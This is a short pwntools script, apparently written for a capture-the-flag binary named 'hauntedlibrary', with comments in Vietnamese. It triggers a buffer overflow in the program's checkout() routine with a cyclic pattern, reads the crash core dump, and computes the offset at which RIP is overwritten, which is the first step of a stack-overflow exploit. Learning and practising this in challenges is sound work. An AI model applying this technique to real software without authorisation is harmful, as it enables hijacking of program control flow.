#!/usr/bin/env python3
from pwn import *

# Cấu hình để pwntools tự động tìm và tải file core
context.binary = elf = ELF('./hauntedlibrary', checksec=False)
context.log_level = 'info'

# Bắt đầu tiến trình
p = process()

# Gửi một chuỗi De Bruijn dài 200 byte
# Option '2' để kích hoạt lỗ hổng trong checkout()
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', cyclic(200))

# Đợi cho chương trình crash
p.wait()

# Tải file core được tạo ra
core = p.corefile

# Đọc giá trị của thanh ghi Instruction Pointer (RIP) tại thời điểm crash
rip_value = core.rip
log.info(f"RIP was overwritten with: {hex(rip_value)}")

# Tìm offset của chuỗi đã ghi đè lên RIP
offset = cyclic_find(rip_value)
log.success(f"THE CORRECT OFFSET IS: {offset}")